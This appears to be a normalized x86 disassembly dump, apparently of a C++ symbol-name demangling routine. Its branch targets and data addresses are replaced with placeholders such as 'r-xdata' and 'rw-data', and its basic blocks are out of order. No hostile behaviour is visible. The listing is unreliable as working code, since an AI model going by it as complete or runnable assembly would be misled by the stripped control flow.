inc [ rw-data ]
cmp eax 0xe
ja r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
mov edx [ ebp - 0x4 ]
and [ ebp - 0x8 ] 0x0
and edx 0xffff0002
push 0x2
pop ecx
or edx ecx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
shr edx 0x1
not edx
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
and eax 0xfffffffe
sub eax 0x0
je r-xdata
push 0x1
sub eax ecx
je r-xdata
push ecx
jmp r-xdata
sub eax ecx
je r-xdata
call sub_42c6d9
add esp 0x4
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d39f
push 0x4
jmp r-xdata
sub eax ecx
je r-xdata
push 0x3
jmp r-xdata
sub eax ecx
je r-xdata
push 0x5
jmp r-xdata
sub eax 0x4
je r-xdata
push 0x6
jmp r-xdata
sub eax ecx
jne r-xdata
push 0x7
jmp r-xdata
sub_42d49c
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
cmp al 0x41
je r-xdata
mov ecx [ ebp + 0x8 ]
inc [ rw-data ]
push r--data
call sub_42d09f
jmp r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
pop ebp
retn
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_42d4e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42d2c8
mov eax esi
pop esi
pop ebp
retn 0x8
sub_42d50b
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42d30b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_42d52f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ebx
mov ebx [ ebp + 0x8 ]
test bl bl
je r-xdata
pop ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push 0x8
mov ecx rw-data
call sub_42c6f8
test eax eax
je r-xdata
push ebx
call sub_42d372
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] bl
jmp r-xdata
push eax
mov ecx esi
call sub_42cd51
sub_42d581
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x1
jg r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
pop esi
pop ebx
cmp [ esi ] bl
je r-xdata
cmp [ edi ] ebx
jne r-xdata
push ebx
push 0xc
mov ecx rw-data
call sub_42c6f8
cmp eax ebx
je r-xdata
push esi
call sub_42d39f
jmp r-xdata
xor eax eax
xor edx edx
cmp [ esi ] bl
je r-xdata
push edx
push esi
mov ecx eax
call sub_42ceb6
jmp r-xdata
inc edx
cmp [ edx + esi ] bl
jne r-xdata
push eax
mov ecx edi
call sub_42cd51
sub_42d5e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ ebp - 0x4 ] 0x1
mov [ esi ] ebx
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
push edi
pop edi
cmp al 0x5a
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_42d52f
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push 0x1
mov ecx esi
call sub_42cfad
movsx eax al
sub eax 0x30
cmp eax 0x9
ja r-xdata
mov edi [ rw-data ]
mov al [ edi ]
cmp al bl
je r-xdata
and [ ebp - 0x8 ] 0xffff0000
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0xc ] ebx
call sub_431744
mov eax [ rw-data ]
sub eax edi
pop ecx
pop ecx
cmp eax 0x1
jle r-xdata
mov ecx [ rw-data ]
push eax
lea eax [ ebp - 0x1c ]
inc edi
push eax
mov [ rw-data ] edi
call sub_42ce67
push eax
mov ecx esi
call sub_42d2c8
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
call sub_42d2c8
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
cmp [ esi + 0x4 ] bl
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] 0x2
mov [ esi ] ebx
lea eax [ ebp - 0x14 ]
push eax
call sub_42ce1d
mov eax [ rw-data ]
mov al [ eax ]
cmp al 0x40
je r-xdata
jmp r-xdata
sub_42d6eb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
push r--data
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42d581
lea eax [ ebp - 0x8 ]
push eax
call sub_430382
pop ecx
push eax
mov ecx esi
call sub_42d2c8
push 0x7d
mov ecx esi
call sub_42d52f
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
mov eax esi
pop esi
leave
retn
inc [ rw-data ]
sub_42d73f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp + 0x8 ]
leave
retn
sub_42d763
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42ccad
mov ecx eax
call sub_42d4e7
mov eax [ ebp + 0x8 ]
leave
retn
sub_42d787
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp + 0x8 ]
leave
retn
sub_42d7ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42d52f
mov eax esi
pop esi
pop ebp
retn 0x8
sub_42d7cf
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_42d581
mov eax esi
pop esi
pop ebp
retn 0x8
sub_42d7f3
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x18
push ebx
xor ebx ebx
cmp [ ecx ] 0x51
jne r-xdata
mov al [ ecx ]
test al al
jne r-xdata
inc ecx
mov ebx r--data
mov [ rw-data ] ecx
cmp al 0x30
jl r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
mov eax [ ebp + 0x8 ]
jmp r-xdata
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
cmp al 0x39
jg r-xdata
pop ebx
leave
retn
cmp al 0x40
jne r-xdata
movsx eax [ ecx ]
sub eax 0x2f
cdq
inc ecx
push edx
mov [ rw-data ] ecx
push eax
test ebx ebx
je r-xdata
test al al
je r-xdata
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_42d19b
lea ecx [ ebp - 0x8 ]
call sub_42d19b
push eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42d787
add esp 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp [ ebp + 0xc ] 0x0
push edi
push esi
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
jmp r-xdata
pop edi
pop esi
cmp al 0x50
jg r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
movsx eax al
shld edi esi 0x4
sub eax 0x41
cdq
shl esi 0x4
add eax esi
adc edi edx
inc ecx
mov esi eax
mov [ rw-data ] ecx
mov al [ ecx ]
lea ecx [ ebp - 0x8 ]
call sub_42d19b
lea ecx [ ebp - 0x18 ]
call sub_42d19b
lea ecx [ ebp - 0x8 ]
call sub_42d209
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call sub_42d209
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
push eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_42d787
add esp 0xc
jmp r-xdata
sub_42d939
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
mov al [ eax ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0xffff0000
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
mov eax [ ebp + 0x8 ]
leave
retn
movsx eax al
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
jmp [ eax * 4 + jump_table_42da05 ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov eax [ rw-data ]
movsx eax [ eax ]
inc [ rw-data ]
sub eax 0x31
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_42d39f
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn
dec eax
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
sub_42da25
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
movsx eax [ eax ]
sub esp 0x10
sub eax 0x58
je r-xdata
inc [ rw-data ]
push r--data
dec eax
dec eax
je r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_42d5e5
pop ecx
mov ecx [ ebp - 0x4 ]
test cl cl
jne r-xdata
push eax
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_42d09f
mov eax [ ebp + 0x8 ]
leave
retn
cmp al 0x40
je r-xdata
inc [ rw-data ]
cmp al 0x5a
je r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d7cf
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
leave
retn
mov eax r--data
sub_42db05
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov al [ eax ]
sub esp 0x18
test al al
je r-xdata
push 0x29
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x1
push eax
push r--data
lea ecx [ ebp - 0x10 ]
call sub_42d09f
mov ecx eax
call sub_42d2a4
mov ecx eax
cmp al 0x5a
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_42da25
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
push 0x29
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
inc [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
and edx 0xffff0000
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn
call sub_42d7ab
mov eax [ ebp + 0x8 ]
leave
retn
sub_42db8f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x8 ] 0xffff0000
push ebx
xor ebx ebx
xor ecx ecx
inc [ rw-data ]
mov eax [ rw-data ]
mov dl [ eax ]
movsx eax dl
push esi
mov esi eax
sub esi 0x41
push edi
mov edi 0xffff00ff
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec esi
je r-xdata
mov eax [ ebp + 0x8 ]
inc [ rw-data ]
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] edi
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
cmp [ eax ] 0x26
mov eax r--data
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec esi
je r-xdata
mov [ ecx ] eax
mov eax r--data
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x10 ]
and [ ebp - 0x8 ] 0xffffff00
and [ ebp - 0x8 ] edi
mov [ eax ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0x3e
mov [ ebp - 0xc ] ebx
call sub_42cfef
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] r--data
jmp r-xdata
cmp dl bl
je r-xdata
mov [ eax ] ebx
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx [ rw-data ]
mov dl [ edx + 0x1 ]
cmp dl bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x14 ] ebx
je r-xdata
add [ rw-data ] 0x2
add eax 0xffffffd0
movsx edx dl
add eax eax
lea esi [ edx + eax * 8 - 0x30 ]
cmp esi 0x1
jbe r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x8 ] 0xffffff00
and [ ebp - 0x8 ] 0xffff00ff
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0x2c
mov [ ebp - 0xc ] ebx
call sub_42cfef
push ebx
push esi
lea ecx [ ebp - 0x1c ]
call sub_42d19b
push eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_42d4e7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0x10 ] ecx
push 0x5e
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
call sub_42d52f
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
inc [ rw-data ]
jmp r-xdata
mov [ ebp - 0x14 ] ecx
push 0x3e
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_42d52f
mov edx [ rw-data ]
cmp [ edx ] 0x24
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jne r-xdata
push 0x1
lea ecx [ ebp - 0xc ]
call sub_42cfad
inc [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
or ecx 0x4000
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_42dd57
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x38
push ebx
xor ebx ebx
cmp [ eax ] bl
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] ebx
je r-xdata
call sub_42c0bf
mov [ ebp - 0x4 ] eax
cmp eax ebx
jge r-xdata
lea eax [ ebp - 0x38 ]
push 0x5d
push eax
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
push r--data
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_42d581
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push 0x1
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
call sub_42cfad
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x5d
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_42d52f
lea eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push eax
push [ ebp + 0x8 ]
call sub_431381
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
and [ ebp - 0xc ] 0xffff0000
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi 0x800
mov [ ebp - 0x10 ] ebx
test [ edi + 0x4 ] esi
je r-xdata
lea eax [ ebp - 0x28 ]
push 0x5d
push eax
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
push r--data
lea ecx [ ebp - 0x10 ]
call sub_42d581
jmp r-xdata
push 0x1
push eax
push 0x5b
call sub_42d072
mov ecx eax
call sub_42d2a4
mov ecx eax
call sub_42d7ab
mov eax [ ebp - 0x4 ]
dec [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ edi ] ebx
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_431744
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x24 ]
or ecx esi
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
jmp r-xdata
test [ edi + 0x4 ] esi
je r-xdata
lea eax [ ebp - 0x30 ]
push ebx
push eax
call sub_42d7f3
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x5b
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x5d
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_42d52f
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_42d2c8
pop ebx
leave
retn
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_42d52f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov ecx edi
call sub_42d4e7
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0xc ] eax
sub_42df4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42d7f3
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x60
lea ecx [ ebp - 0x18 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_42d7ab
mov eax [ ebp + 0x8 ]
leave
retn
sub_42dfcc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
inc ebx
mov [ esi + 0x4 ] eax
cmp al bl
jg r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
cmp al bl
jg r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_42cb99
mov eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x20
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_42d52f
push esi
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d4e7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
cmp al bl
jg r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
lea ecx [ ebp - 0x20 ]
call sub_42ccad
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x40
je r-xdata
inc [ rw-data ]
jmp r-xdata
push r--data
jmp r-xdata
mov ecx esi
call sub_42d581
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
cmp al 0x40
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_430382
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x60
lea ecx [ ebp - 0x20 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x27
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_42d52f
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_42d2c8
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
push 0x7d
mov ecx esi
call sub_42d52f
push ebx
mov ecx esi
call sub_42cfad
cmp [ esi + 0x4 ] bl
jg r-xdata
inc eax
mov [ rw-data ] eax
cmp [ eax ] 0x40
je r-xdata
cmp [ esi + 0x4 ] bl
jle r-xdata
push r--data
sub_42e12b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
call sub_42d09f
mov eax [ rw-data ]
mov al [ eax ]
inc [ rw-data ]
cmp al 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
mov eax [ rw-data ]
mov al [ eax ]
inc [ rw-data ]
cmp al 0x5f
jne r-xdata
inc [ rw-data ]
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42d7f3
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_42d7f3
mov eax [ rw-data ]
mov cl [ eax ]
add esp 0x10
test cl cl
je r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
push 0x1
mov [ rw-data ] eax
call sub_42ccad
mov eax [ ebp + 0x8 ]
leave
retn
cmp cl 0x40
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc eax
mov [ rw-data ] eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov ecx [ ebp - 0x8 ]
inc eax
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_42e1de
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov al [ eax ]
test al al
jne r-xdata
push 0x0
cmp al 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
jmp r-xdata
push [ ebp + 0x8 ]
call sub_42d7f3
pop ecx
pop ecx
inc [ rw-data ]
lea eax [ ebp - 0x8 ]
push eax
call sub_42d7f3
push eax
push 0x2d
push [ ebp + 0x8 ]
call sub_42d73f
add esp 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn
sub_42e230
mov edi edi
push ebp
mov ebp esp
sub esp 0xc8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov bl [ eax ]
inc [ rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movsx edi bl
cmp edi 0x44
jg r-xdata
cmp edi 0x45
je r-xdata
je r-xdata
push esi
call sub_430114
jle r-xdata
lea eax [ ebp - 0x80 ]
push eax
call sub_42e1de
test [ rw-data ] 0x4000
pop ecx
je r-xdata
sub edi 0x0
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
jmp r-xdata
cmp edi 0x4a
jle r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x88 ]
lea ecx [ ebp - 0xc ]
push eax
cmp bl 0x44
jne r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_42ccf2
lea eax [ ebp - 0x14 ]
push eax
call sub_437d67
push eax
call [ rw-data ]
pop ecx
pop ecx
test eax eax
je r-xdata
dec [ rw-data ]
sub edi 0x30
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
push 0x7b
lea ecx [ ebp - 0x80 ]
call sub_42d072
cmp bl 0x48
jl r-xdata
cmp edi 0x51
je r-xdata
push r--data
jmp r-xdata
push r--data
push eax
jmp r-xdata
push esi
call sub_42e1de
jmp r-xdata
dec edi
je r-xdata
sub edi 0x46
je r-xdata
cmp bl 0x4a
jg r-xdata
cmp edi 0x52
jne r-xdata
call sub_42d09f
mov ecx eax
call sub_42d4e7
push r--data
push esi
lea ecx [ ebp - 0x88 ]
call sub_42d7cf
jmp r-xdata
mov ecx esi
call sub_42d09f
jmp r-xdata
pop ecx
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
dec edi
jne r-xdata
lea eax [ ebp - 0xa8 ]
push eax
call sub_42e1de
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_42d2c8
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_42d52f
dec edi
je r-xdata
lea eax [ ebp - 0xb0 ]
push eax
call sub_430114
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_42d2c8
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_42d52f
push 0x0
lea eax [ ebp - 0x88 ]
push 0x0
push eax
call sub_42ef5a
lea eax [ ebp - 0x80 ]
push eax
call sub_42e1de
mov eax [ ebp - 0x88 ]
mov [ esi ] eax
mov eax [ ebp - 0x84 ]
add esp 0x10
mov [ esi + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0xc8 ]
push eax
call sub_430114
pop ecx
push eax
push esi
push r--data
lea ecx [ ebp - 0x90 ]
call sub_42d09f
jmp r-xdata
inc [ rw-data ]
push r--data
lea eax [ ebp - 0x80 ]
push eax
call sub_42e1de
lea eax [ ebp - 0x88 ]
push eax
call sub_42e1de
